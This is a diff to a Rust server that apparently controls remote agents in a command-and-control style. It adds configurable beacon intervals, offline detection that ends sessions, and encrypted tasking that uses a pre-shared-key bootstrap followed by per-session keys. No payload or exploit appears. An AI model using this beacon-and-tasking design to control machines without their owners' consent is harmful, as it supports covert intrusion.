@@ -19,15 +19,13 @@ use serde::{Deserialize, Serialize};
 
 mod db;
 mod logger;
-mod registry;
 mod sessions;
 mod auth;
 mod crypto;
 mod websocket;
 mod tls_util;
 
-use db::{Database, AgentMetrics, CommandResult};
-use registry::AgentRegistry;
+use db::{Database, AgentMetrics, CommandResult, validate_beacon_interval, DEFAULT_BEACON_INTERVAL_SECS};
 use sessions::SessionManager;
 use websocket::{ServerState, dashboard_ws_handler, PendingCommand};
 use logger::{log_info, log_warn};
@@ -55,6 +53,7 @@ struct BeaconResponse {
     success: bool,
     timestamp: String,
     commands: Vec<PendingCommand>,
+    sleep_interval_secs: u64,
     #[serde(skip_serializing_if = "Option::is_none")]
     session_key: Option<String>,
 }
@@ -102,14 +101,13 @@ async fn main() {
     let now_str = Utc::now().to_rfc3339();
     let _ = db.end_all_active_sessions(&now_str);
 
-    let registry = AgentRegistry::new();
     let session_manager = SessionManager::new(db.clone());
+    let offline_sessions = session_manager.clone();
 
     let (tx, _) = broadcast::channel::<Value>(1024);
 
     let state = ServerState {
         db: db.clone(),
-        registry,
         session_manager,
         tx: tx.clone(),
         command_queue: Arc::new(tokio::sync::RwLock::new(HashMap::new())),
@@ -134,9 +132,12 @@ async fn main() {
                     }
                     if let Ok(last) = chrono::DateTime::parse_from_rfc3339(&agent.last_seen) {
                         let elapsed = now.signed_duration_since(last).num_seconds();
-                        if elapsed > 90 {
+                        // Mark offline after 3 missed beacons based on configured interval.
+                        let timeout = (agent.beacon_interval_secs * 3).max(90) as i64;
+                        if elapsed > timeout {
                             let ts = now.to_rfc3339();
                             let _ = offline_db.update_agent_status(&agent.id, "Offline", &ts);
+                            let _ = offline_sessions.end_session(&agent.id);
                             log_info(
                                 &offline_db,
                                 &offline_tx,
@@ -195,6 +196,7 @@ async fn receive_beacon(
     Json(envelope): Json<EncryptedEnvelope>,
 ) -> Result<Json<EncryptedEnvelope>, StatusCode> {
     let psk = auth::get_psk();
+    // PSK-derived key is used only to decrypt bootstrap beacons and encrypt the key-exchange response.
     let psk_key = crypto::derive_key_from_psk(&psk);
 
     let (data, used_psk) = decrypt_beacon(&state, &headers, &envelope.payload, &psk_key).await?;
@@ -209,12 +211,18 @@ async fn receive_beacon(
     let hostname = data.hostname.unwrap_or_else(|| "unknown".to_string());
     let os = data.os.unwrap_or_else(|| "unknown".to_string());
 
+    let beacon_interval = state
+        .db
+        .get_beacon_interval(&data.id)
+        .unwrap_or(DEFAULT_BEACON_INTERVAL_SECS);
+
     let agent = db::Agent {
         id: data.id.clone(),
         hostname: hostname.clone(),
         os: os.clone(),
         status: "Online".to_string(),
         last_seen: now.clone(),
+        beacon_interval_secs: beacon_interval,
     };
     let _ = state.db.upsert_agent(&agent);
     let _ = state.session_manager.start_session(&data.id);
@@ -256,8 +264,51 @@ async fn receive_beacon(
 
     let commands = {
         let mut queue = state.command_queue.write().await;
-        queue.remove(&agent.id).unwrap_or_default()
+        let pending = queue.remove(&agent.id).unwrap_or_default();
+        let mut outbound = Vec::new();
+
+        for cmd in pending {
+            if cmd.command_type == "set_interval" {
+                match cmd.payload.trim().parse::<u64>() {
+                    Ok(requested) => match validate_beacon_interval(requested) {
+                        Ok(valid) => {
+                            let _ = state.db.update_beacon_interval(&agent.id, valid);
+                            log_info(
+                                &state.db,
+                                &state.tx,
+                                "Interval",
+                                Some(agent.id.clone()),
+                                &format!("Beacon interval updated to {} seconds", valid),
+                            );
+                        }
+                        Err(e) => log_warn(
+                            &state.db,
+                            &state.tx,
+                            "Interval",
+                            Some(agent.id.clone()),
+                            &format!("Rejected interval update: {}", e),
+                        ),
+                    },
+                    Err(_) => log_warn(
+                        &state.db,
+                        &state.tx,
+                        "Interval",
+                        Some(agent.id.clone()),
+                        "Rejected interval update: payload must be an integer",
+                    ),
+                }
+            } else {
+                outbound.push(cmd);
+            }
+        }
+
+        outbound
     };
+
+    let sleep_interval_secs = state
+        .db
+        .get_beacon_interval(&agent.id)
+        .unwrap_or(DEFAULT_BEACON_INTERVAL_SECS);
 
     if !commands.is_empty() {
         log_info(
@@ -271,6 +322,7 @@ async fn receive_beacon(
 
     let mut session_key_out: Option<String> = None;
     if used_psk {
+        // First contact: issue a fresh per-session AES key for all later traffic.
         let new_key = crypto::generate_session_key_hex();
         {
             let mut keys = state.session_keys.write().await;
@@ -290,6 +342,7 @@ async fn receive_beacon(
         success: true,
         timestamp: now,
         commands,
+        sleep_interval_secs,
         session_key: session_key_out,
     };
 
@@ -313,6 +366,7 @@ async fn decrypt_beacon(
     payload: &str,
     psk_key: &[u8; 32],
 ) -> Result<(BeaconData, bool), StatusCode> {
+    // Bootstrap path: agent marks first beacon with bootstrap=true, encrypted under PSK.
     if let Ok(plaintext) = crypto::decrypt(payload, psk_key) {
         if let Ok(data) = serde_json::from_slice::<BeaconData>(&plaintext) {
             if data.bootstrap {
@@ -321,6 +375,7 @@ async fn decrypt_beacon(
         }
     }
 
+    // Session path: decrypt with the in-memory session key established after bootstrap.
     let agent_id = headers
         .get("X-Agent-Id")
         .and_then(|v| v.to_str().ok())
